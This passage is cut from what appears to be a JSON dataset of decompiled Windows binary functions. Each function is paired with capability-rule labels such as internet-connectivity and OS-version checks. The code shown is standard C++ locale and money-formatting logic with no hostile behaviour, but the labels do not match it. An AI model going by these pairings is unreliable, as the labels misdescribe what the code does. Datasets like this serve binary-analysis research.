        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042fa73(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    uint8_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    code **ppcVar7;\n    code **arg_ch_00;\n    int32_t unaff_EBP;\n    ulong uVar8;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar9;\n    \n    uVar9 = 8;\n    fcn.0043acd3();\n    arg_8h_00 = *(unaff_EBP + 0x10);\n    uVar2 = *(unaff_EBP + 0xc) & 2;\n    *(unaff_EBP + -0x10) = uVar2;\n    arg_ch_00 = NULL;\n    if (uVar2 != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(0x44, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                uVar4 = *(unaff_EBP + 8);\n                ppcVar3[1] = NULL;\n                *ppcVar3 = vtable.std::ctype_wchar_t_.0;\n                fcn.0042ece3(uVar4);\n                ppcVar7 = ppcVar3;\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004284ab(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    if ((*(unaff_EBP + 0xc) & 8) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::num_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(8, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::num_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(0x18, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            *(unaff_EBP + -4) = 7;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                uVar4 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 8;\n                *ppcVar3 = vtable.std::numpunct_wchar_t_.0;\n                fcn.0042ee17(uVar4, 0);\n                ppcVar7 = ppcVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428c73(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428dbf(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428f0b(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    uVar1 = fcn.0042a17e(0, 0);\n    if ((*(unaff_EBP + 0xc) & (1 << (uVar1 & 0x1f)) >> 1) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(0x10, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = vtable.std::collate_wchar_t_.0;\n                uVar8 = fcn.00439a13();\n                ppcVar3[2] = uVar8;\n                ppcVar3[3] = uVar8 >> 0x20;\n                ppcVar7 = ppcVar3;\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.0042835f(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    uVar2 = *(unaff_EBP + 0xc);\n    if ((uVar2 & 0x20) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = vtable.std::messages_wchar_t_.0;\n                ppcVar7 = ppcVar3;\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004285f7(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n        uVar2 = *(unaff_EBP + 0xc);\n    }\n    if ((uVar2 & 4) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::money_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(8, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::money_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(0x58, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            *(unaff_EBP + -4) = 0x10;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                uVar4 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0x11;\n                *ppcVar3 = vtable.std::_Mpunct_wchar_t_.0;\n                *(ppcVar3 + 10) = 0;\n                fcn.0042ec0d(uVar4, 0);\n                *ppcVar3 = vtable.std::moneypunct_wchar_t__0_.0;\n                ppcVar7 = ppcVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(0x58, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            *(unaff_EBP + -4) = 0x16;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                uVar9 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0x17;\n                *ppcVar3 = vtable.std::_Mpunct_wchar_t_.0;\n                *(ppcVar3 + 10) = 1;\n                fcn.0042ec0d(uVar9, 0);\n                *ppcVar3 = vtable.std::moneypunct_wchar_t__1_.0;\n                ppcVar7 = ppcVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428743(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.0042888f(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428b27(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428a81(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n        uVar2 = *(unaff_EBP + 0xc);\n    }\n    if ((uVar2 & 0x10) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            iVar6 = fcn.0043a4f7(0x44, uVar9);\n            *(unaff_EBP + -0x14) = iVar6;\n            *(unaff_EBP + -4) = 0x1b;\n            ppcVar7 = arg_ch_00;\n            if (iVar6 != 0) {\n                ppcVar7 = fcn.00429363(*(unaff_EBP + 8), 0);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            iVar6 = fcn.0043a4f7(0xc, uVar4);\n            *(unaff_EBP + -0x14) = iVar6;\n            ppcVar7 = arg_ch_00;\n            if (iVar6 != 0) {\n                uVar9 = *(unaff_EBP + 8);\n                ppcVar7 = fcn.004293c9(uVar9, 0);\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00429057(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004291a3(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    if (*(unaff_EBP + -0x10) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            iVar6 = fcn.0043a4f7(0x34, uVar9);\n            *(unaff_EBP + -0x14) = iVar6;\n            if (iVar6 != 0) {\n                arg_ch_00 = fcn.004292f7(*(unaff_EBP + 8), 0);\n            }\n            uVar9 = fcn.00401800();\n            fcn.00423876(arg_8h_00, arg_ch_00, uVar9);\n        }\n        else {\n            uVar9 = fcn.00401800();\n            uVar4 = fcn.00428213(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar4, uVar9);\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 3737
    },
    "004300f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.004300f2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint arg_14h_00;\n    char cVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    int32_t arg_8h_00;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint arg_ch_00;\n    int32_t unaff_EBP;\n    code *pcVar9;\n    uint32_t uVar10;\n    uint uVar11;\n    int32_t arg_18h_00;\n    uint var_e8h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_58h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xdc);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xa0) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x3c);\n    uVar11 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -4) = 0;\n    fcn.00421bb3(uVar11);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar3 = fcn.004289db(unaff_EBP + -0x98);\n        *(unaff_EBP + -0x7c) = piVar3;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar3 = fcn.00428935(unaff_EBP + -0x98);\n        *(unaff_EBP + -0x7c) = piVar3;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00401990();\n    pcVar9 = *(*piVar3 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar9)();\n    iVar7 = *piVar3;\n    *(unaff_EBP + -4) = 3;\n    pcVar9 = *(iVar7 + 0x24);\n    (**0x4742a4)();\n    uVar4 = (*pcVar9)();\n    uVar4 = (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f);\n    *(unaff_EBP + -0x78) = uVar4;\n    if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n        fcn.004352e7(0, (uVar4 - *(unaff_EBP + 0x34)) + 1, *(unaff_EBP + -0x8c));\n    }\n    else {\n        pcVar5 = unaff_EBP + -0x40;\n        if (0xf < *(unaff_EBP + -0x2c)) {\n            pcVar5 = *(unaff_EBP + -0x40);\n        }\n        if (*pcVar5 != '\\x7f') {\n            pcVar5 = unaff_EBP + -0x40;\n            if (0xf < *(unaff_EBP + -0x2c)) {\n                pcVar5 = *(unaff_EBP + -0x40);\n            }\n            if ('\\0' < *pcVar5) {\n                pcVar9 = *(*piVar3 + 0x10);\n                (**0x4742a4)();\n                uVar4 = (*pcVar9)();\n                pcVar5 = unaff_EBP + -0x40;\n                *(unaff_EBP + -0x84) = uVar4 & 0xffff;\n                if (0xf < *(unaff_EBP + -0x2c)) {\n                    pcVar5 = *(unaff_EBP + -0x40);\n                }\n                uVar4 = *(unaff_EBP + 0x34) - *(unaff_EBP + -0x78);\n                cVar2 = *pcVar5;\n                if (cVar2 != '\\x7f') {\n                    uVar11 = *(unaff_EBP + -0x84);\n                    do {\n                        if ((cVar2 < '\\x01') || (uVar4 <= cVar2)) break;\n                        uVar4 = uVar4 - cVar2;\n                        fcn.004352e7(uVar4, 1, uVar11);\n                        if ('\\0' < pcVar5[1]) {\n                            pcVar5 = pcVar5 + 1;\n                        }\n                        cVar2 = *pcVar5;\n                    } while (cVar2 != '\\x7f');\n                    piVar3 = *(unaff_EBP + -0x7c);\n                }\n                uVar4 = *(unaff_EBP + -0x78);\n            }\n        }\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    iVar7 = *piVar3;\n    *(unaff_EBP + -4) = 4;\n    if (*(unaff_EBP + 0x20) == '\\0') {\n        (**0x4742a4)(unaff_EBP + -0x84);\n        (**(iVar7 + 0x28))();\n        *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x84);\n        pcVar9 = *(*piVar3 + 0x1c);\n    }\n    else {\n        (**0x4742a4)();\n        (**(iVar7 + 0x2c))();\n        *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x84);\n        pcVar9 = *(*piVar3 + 0x20);\n    }\n    (**0x4742a4)(unaff_EBP + -0x70);\n    (*pcVar9)();\n    fcn.004294b3(unaff_EBP + -0x70);\n    fcn.00430cd4();\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 7;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -4) = 5;\n    if ((*(*(unaff_EBP + -0x90) + 0x14) & 8) != 0) {\n        pcVar9 = *(*piVar3 + 0x18);\n        (**0x4742a4)(unaff_EBP + -0x70);\n        (*pcVar9)();\n        fcn.004294b3(unaff_EBP + -0x70);\n        fcn.00430cd4();\n    }\n    cVar2 = '\\0';\n    uVar8 = 0;\n    *(unaff_EBP + -0x71) = 0;\n    uVar10 = 0;\n    do {\n        cVar1 = *(unaff_EBP + -0x7c + uVar10);\n        if (cVar1 == ' ') {\n            uVar8 = uVar8 + 1;\ncode_r0x0043037c:\n            if (uVar10 != 3) {\n                cVar2 = '\\x01';\n                *(unaff_EBP + -0x71) = 1;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar8 = uVar8 + *(unaff_EBP + -0x48);\n        }\n        else if (cVar1 == '+') {\n            uVar8 = uVar8 + *(unaff_EBP + -0x18);\n        }\n        else if (cVar1 == 'v') {\n            if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n                iVar7 = (uVar4 - *(unaff_EBP + 0x34)) + 1;\n            }\n            else {\n                iVar7 = 0;\n            }\n            cVar2 = *(unaff_EBP + -0x71);\n            uVar8 = uVar8 + (uVar4 != 0) + *(unaff_EBP + 0x34) + iVar7;\n        }\n        else if (cVar1 == 'x') goto code_r0x0043037c;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 4);\n    iVar7 = *(unaff_EBP + -0x90);\n    uVar4 = *(iVar7 + 0x20);\n    if ((*(iVar7 + 0x24) < 0) || (((*(iVar7 + 0x24) < 1 && (uVar4 == 0)) || (uVar4 <= uVar8)))) {\n        arg_18h_00 = 0;\n    }\n    else {\n        arg_18h_00 = uVar4 - uVar8;\n    }\n    uVar4 = *(iVar7 + 0x14) & 0x1c0;\n    *(unaff_EBP + -0x94) = uVar4;\n    if ((uVar4 == 0x40) || ((uVar4 == 0x100 && (cVar2 != '\\0')))) {\n        uVar11 = *(unaff_EBP + 0x10);\n        arg_ch_00 = *(unaff_EBP + 0xc);\n    }\n    else {\n        puVar6 = fcn.00430c34(unaff_EBP + -0x88, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + -0x80), \n                              arg_18h_00);\n        arg_18h_00 = 0;\n        arg_ch_00 = *puVar6;\n        *(unaff_EBP + 0xc) = arg_ch_00;\n        uVar11 = puVar6[1];\n        *(unaff_EBP + 0x10) = uVar11;\n    }\n    uVar4 = 0;\n    *(unaff_EBP + -0x84) = 0;\n    do {\n        cVar2 = *(unaff_EBP + -0x7c + uVar4);\n        if (cVar2 == ' ') {\n            puVar6 = fcn.00430c34(unaff_EBP + -0xe8, arg_ch_00, uVar11, *(unaff_EBP + -0x80), 1);\n            arg_ch_00 = *puVar6;\n            *(unaff_EBP + 0xc) = arg_ch_00;\n            uVar11 = puVar6[1];\n            *(unaff_EBP + 0x10) = uVar11;\ncode_r0x004305cb:\n            if (*(unaff_EBP + -0x94) != 0x100) goto code_r0x004305f9;\n            puVar6 = fcn.00430c34(unaff_EBP + -0xa8, arg_ch_00, uVar11, *(unaff_EBP + -0x80), arg_18h_00);\n            arg_18h_00 = 0;\ncode_r0x004305ee:\n            arg_ch_00 = *puVar6;\n            *(unaff_EBP + 0xc) = arg_ch_00;\n            uVar11 = puVar6[1];\n            *(unaff_EBP + 0x10) = uVar11;\n        }\n        else {\n            if (cVar2 == '$') {\n                iVar7 = unaff_EBP + -0x58;\n                if (7 < *(unaff_EBP + -0x44)) {\n                    iVar7 = *(unaff_EBP + -0x58);\n                }\n                var_18h = *(unaff_EBP + -0x48);\n                arg_8h_00 = unaff_EBP + -0xe0;\ncode_r0x00430452:\n                puVar6 = fcn.00430084(arg_8h_00, arg_ch_00, uVar11, iVar7, var_18h);\n                goto code_r0x004305ee;\n            }\n            if (cVar2 == '+') {\n                if (*(unaff_EBP + -0x18) != 0) {\n                    iVar7 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    var_18h = 1;\n                    arg_8h_00 = unaff_EBP + -0xd8;\n                    goto code_r0x00430452;\n                }\n            }\n            else {\n                if (cVar2 == 'v') {\n                    uVar4 = *(unaff_EBP + -0x78);\n                    if (uVar4 == 0) {\n                        iVar7 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + 0x34);\n                        arg_8h_00 = unaff_EBP + -0xb0;\n                    }\n                    else if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n                        fcn.004294ea(*(unaff_EBP + -0x8c));\n                        pcVar9 = *(*piVar3 + 0xc);\n                        (**0x4742a4)();\n                        uVar4 = (*pcVar9)();\n                        fcn.004294ea(uVar4 & 0xffff);\n                        puVar6 = fcn.00430c34(unaff_EBP + -0xb8, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                                              *(unaff_EBP + -0x8c), *(unaff_EBP + -0x78) - *(unaff_EBP + 0x34));\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = puVar6[1];\n                        iVar7 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + 0x34);\n                        uVar11 = puVar6[1];\n                        arg_8h_00 = unaff_EBP + -0xc0;\n                        arg_ch_00 = *puVar6;\n                    }\n                    else {\n                        *(unaff_EBP + -0x9c) = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            *(unaff_EBP + -0x9c) = *(unaff_EBP + 0x24);\n                        }\n                        puVar6 = fcn.00430084(unaff_EBP + -200, arg_ch_00, uVar11, *(unaff_EBP + -0x9c), \n                                              *(unaff_EBP + 0x34) - uVar4);\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = puVar6[1];\n                        pcVar9 = *(*piVar3 + 0xc);\n                        (**0x4742a4)();\n                        uVar4 = (*pcVar9)();\n                        fcn.004294ea(uVar4 & 0xffff);\n                        iVar7 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + -0x78);\n                        iVar7 = iVar7 + *(unaff_EBP + 0x34) * 2 + var_18h * -2;\n                        uVar11 = *(unaff_EBP + 0x10);\n                        arg_8h_00 = unaff_EBP + -0xd0;\n                        arg_ch_00 = *(unaff_EBP + 0xc);\n                    }\n                    goto code_r0x00430452;\n                }\n                if (cVar2 == 'x') goto code_r0x004305cb;\n            }\n        }\ncode_r0x004305f9:\n        uVar4 = *(unaff_EBP + -0x84) + 1;\n        *(unaff_EBP + -0x84) = uVar4;\n        if (3 < uVar4) {\n            if (1 < *(unaff_EBP + -0x18)) {\n                iVar7 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                puVar6 = fcn.00430084(unaff_EBP + -0xa8, arg_ch_00, uVar11, iVar7 + 2, *(unaff_EBP + -0x18) + -1);\n                arg_ch_00 = *puVar6;\n                *(unaff_EBP + 0xc) = arg_ch_00;\n                uVar11 = puVar6[1];\n                *(unaff_EBP + 0x10) = uVar11;\n            }\n            iVar7 = *(unaff_EBP + -0x90);\n            arg_14h_00 = *(unaff_EBP + -0x80);\n            *(iVar7 + 0x20) = 0;\n            *(iVar7 + 0x24) = 0;\n            fcn.00430c34(*(unaff_EBP + -0xa0), arg_ch_00, uVar11, arg_14h_00, arg_18h_00);\n            fcn.00430cd4();\n            fcn.00430cd4();\n            fcn.00406810();\n            fcn.00430cd4();\n            fcn.0043acb1();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4494
    },
    "00430693": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00430693(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint arg_14h_00;\n    char cVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    int32_t arg_8h_00;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint arg_ch_00;\n    int32_t unaff_EBP;\n    code *pcVar9;\n    uint32_t uVar10;\n    uint uVar11;\n    int32_t arg_18h_00;\n    uint var_e8h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_58h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xdc);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xa0) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x3c);\n    uVar11 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -4) = 0;\n    fcn.00421bb3(uVar11);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar3 = fcn.00428b27(unaff_EBP + -0x98);\n        *(unaff_EBP + -0x7c) = piVar3;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar3 = fcn.00428a81(unaff_EBP + -0x98);\n        *(unaff_EBP + -0x7c) = piVar3;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00401990();\n    pcVar9 = *(*piVar3 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar9)();\n    iVar7 = *piVar3;\n    *(unaff_EBP + -4) = 3;\n    pcVar9 = *(iVar7 + 0x24);\n    (**0x4742a4)();\n    uVar4 = (*pcVar9)();\n    uVar4 = (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f);\n    *(unaff_EBP + -0x78) = uVar4;\n    if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n        fcn.00435361(0, (uVar4 - *(unaff_EBP + 0x34)) + 1, *(unaff_EBP + -0x8c));\n    }\n    else {\n        pcVar5 = unaff_EBP + -0x40;\n        if (0xf < *(unaff_EBP + -0x2c)) {\n            pcVar5 = *(unaff_EBP + -0x40);\n        }\n        if (*pcVar5 != '\\x7f') {\n            pcVar5 = unaff_EBP + -0x40;\n            if (0xf < *(unaff_EBP + -0x2c)) {\n                pcVar5 = *(unaff_EBP + -0x40);\n            }\n            if ('\\0' < *pcVar5) {\n                pcVar9 = *(*piVar3 + 0x10);\n                (**0x4742a4)();\n                uVar4 = (*pcVar9)();\n                pcVar5 = unaff_EBP + -0x40;\n                *(unaff_EBP + -0x84) = uVar4 & 0xffff;\n                if (0xf < *(unaff_EBP + -0x2c)) {\n                    pcVar5 = *(unaff_EBP + -0x40);\n                }\n                uVar4 = *(unaff_EBP + 0x34) - *(unaff_EBP + -0x78);\n                cVar2 = *pcVar5;\n                if (cVar2 != '\\x7f') {\n                    uVar11 = *(unaff_EBP + -0x84);\n                    do {\n                        if ((cVar2 < '\\x01') || (uVar4 <= cVar2)) break;\n                        uVar4 = uVar4 - cVar2;\n                        fcn.00435361(uVar4, 1, uVar11);\n                        if ('\\0' < pcVar5[1]) {\n                            pcVar5 = pcVar5 + 1;\n                        }\n                        cVar2 = *pcVar5;\n                    } while (cVar2 != '\\x7f');\n                    piVar3 = *(unaff_EBP + -0x7c);\n                }\n                uVar4 = *(unaff_EBP + -0x78);\n            }\n        }\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    iVar7 = *piVar3;\n    *(unaff_EBP + -4) = 4;\n    if (*(unaff_EBP + 0x20) == '\\0') {\n        